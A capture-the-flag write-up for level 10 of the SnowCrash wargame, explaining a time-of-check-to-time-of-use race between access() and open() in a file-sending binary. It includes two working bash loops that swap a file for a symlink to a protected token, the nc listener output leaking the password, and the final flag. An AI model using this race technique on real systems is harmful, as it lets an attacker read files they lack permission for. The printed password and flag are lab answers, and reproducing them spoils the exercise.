## Level 10

We can see once again two files `token` and `level10`.

Obviously we can't read token, and we can execute `level10` passing it a file and an ip address!

As we can see in the [decompiled level10](./level10_decomp.c), it sends the content of the file we pass to the ip address through a socket.

We can use `nc` to capture this traffic. More specificaly, we can use `nc -l -k <ip> <port>` so that it keeps the connection alive while we spam it.

## Exploit

Speaking of spamming, the important part here are two syscalls in the executable:

```c
	iVar2 = access((char *)in_stack_00000008[1],4);
	// more blabla and checks
	iVar3 = open(pcVar6,0);
```

Access checks if the user executing the program could read the content of the file we pass as an argument, and open obviously tries to open it.
However, the fact that they are separated calls means one thing, there is a timing during which we can modify the file between `access` and `open`, abusing the first permission check.

### Our objective

We want the executable to check access on a file we created, so that we pass the check, then create a symlink from this file to the token for which we don't have access.

### How ?

Simply with two bash scripts:

The first one will take care of the file swapping thingy as such:

```bash
while [ 1 ]
do
        touch /var/crash/swap
        rm -rf /var/crash/swap
        ln -s ~/token /var/crash/swap
        rm -rf /var/crash/swap
done
```

And the second one which will spam our executable with the file we create until we have a wonderful result:

```bash
while [ 1 ]
do
        ./level10 /var/crash/swap 10.14.6.1
done
```

It's simply bruteforcing and we can see the result on nc when we launch both scripts:

```bash
~/Documents/42/snow_crash/level10/res (main*) » nc -l -k 10.14.6.1 6969
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
```

And that's how we can trick our program to get read a new file between two calls!

## Password

woupa2yuojeeaaed06riuj63c

## Token

```bash
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$ 
```
